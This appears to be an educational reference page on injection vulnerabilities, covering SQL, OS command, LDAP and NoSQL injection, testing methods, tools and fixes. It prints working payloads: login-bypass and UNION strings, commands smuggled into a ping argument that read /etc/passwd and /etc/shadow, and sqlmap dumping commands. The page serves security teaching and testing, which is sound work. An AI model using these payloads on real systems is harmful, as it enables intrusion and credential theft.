# A03 — Injection

**CVSS Range:** Up to 9.8 (Critical)
**CWE References:** CWE-89 (SQLi), CWE-79 (XSS), CWE-78 (Command injection)

---

### What it is
Injection occurs when user-supplied data is sent to an interpreter as part of a command or query. The interpreter cannot distinguish between trusted code and attacker-controlled data, so it executes the attacker's instructions.

The most well-known type is SQL injection, but injection applies to any interpreter: OS shell, LDAP, XPath, NoSQL, SMTP headers, expression languages, and more.

### Why it happens
- User input is concatenated directly into queries or commands
- Input is not validated or sanitised
- Parameterised queries or prepared statements are not used
- Error messages reveal query structure

### Attack types

**SQL Injection:**
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$input' AND password = '$pass'

-- Attacker input for username field:
admin' --
-- Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
-- Login bypassed — password check commented out

-- Data extraction (UNION-based)
' UNION SELECT username, password, null FROM users --

-- Blind (boolean-based) — infer data from true/false responses
' AND 1=1 --   (page loads normally)
' AND 1=2 --   (page changes — confirms injection)

-- Time-based blind (no visible output)
'; IF (1=1) WAITFOR DELAY '0:0:5' --   (5-second delay confirms injection)
```

**Command Injection:**
```bash
# Vulnerable code: os.system("ping " + user_input)
# Attacker input:
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 | ls -la
`id`
$(cat /etc/shadow)
```

**LDAP Injection:**
```
# Normal query: (&(uid=john)(password=secret))
# Attacker input for uid field:
*)(&
# Resulting query: (&(uid=*)(&)(password=secret))
# Bypasses authentication
```

**NoSQL Injection (MongoDB):**
```json
# Normal login request body:
{"username": "admin", "password": "secret"}

# Attacker payload:
{"username": "admin", "password": {"$gt": ""}}
# $gt means "greater than empty string" — always true — login bypassed
```

### How to test for it

**Manual testing:**
```
1. Identify all input fields, URL params, cookies, HTTP headers
2. Append special characters: ' " ; ) -- /* `
3. Observe response — errors, behavioural changes, delays

SQLi quick test:
  Input: '
  Input: '' (escaped quote — no error if safe)
  Input: ' OR '1'='1
  Input: '; WAITFOR DELAY '0:0:5'--  (MSSQL time-based)
  Input: ' AND SLEEP(5)--             (MySQL time-based)

Command injection quick test:
  Input: test; sleep 5
  Input: test | sleep 5
  Input: test && sleep 5
```

**Automated testing:**
```bash
# SQLmap against a URL parameter
sqlmap -u "https://target.com/products?id=1" --dbs

# SQLmap with POST data
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --dbs

# SQLmap with Burp request file
sqlmap -r burp_request.txt --dbs --dump
```

### Tools

| Tool | How to use it |
|---|---|
| `sqlmap` | Automated SQLi detection and exploitation |
| `Burp Suite` | Manual injection via Repeater; active scan for XSS/SQLi |
| `commix` | Automated command injection testing |
| `XSStrike` | Advanced XSS detection with WAF bypass |
| `ghauri` | Advanced SQLi tool (alternative to sqlmap) |
| `NoSQLMap` | Automated NoSQL injection attacks |
| `PayloadsAllTheThings` | GitHub payload library for all injection types |

### How to fix it

- Use **parameterised queries** (prepared statements) — this is the #1 fix for SQLi
- Use an ORM (Object-Relational Mapper) that handles escaping by default
- Validate input on the server — type, length, format, range
- Escape output appropriate to context (HTML, SQL, shell)
- Run database users with minimum necessary privileges
- Never display database errors to end users

---
